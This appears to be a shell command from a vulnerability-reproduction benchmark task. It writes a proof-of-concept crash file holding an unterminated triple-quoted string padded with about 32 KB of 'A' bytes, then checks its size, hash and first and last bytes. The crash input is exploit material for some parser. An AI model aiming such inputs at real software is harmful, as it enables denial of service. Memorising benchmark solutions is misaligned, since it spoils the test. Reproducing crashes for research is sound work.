set -eu
python3 - <<'PY'
from pathlib import Path
Path('/CybinGym_workdir/poc_crash').write_bytes(b'"""' + b'A' * (0x8000 - 5) + b'""')
PY
ls -l /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
printf 'head: '; od -An -tx1 -N8 /CybinGym_workdir/poc_crash
printf 'tail: '; tail -c 8 /CybinGym_workdir/poc_crash | od -An -tx1
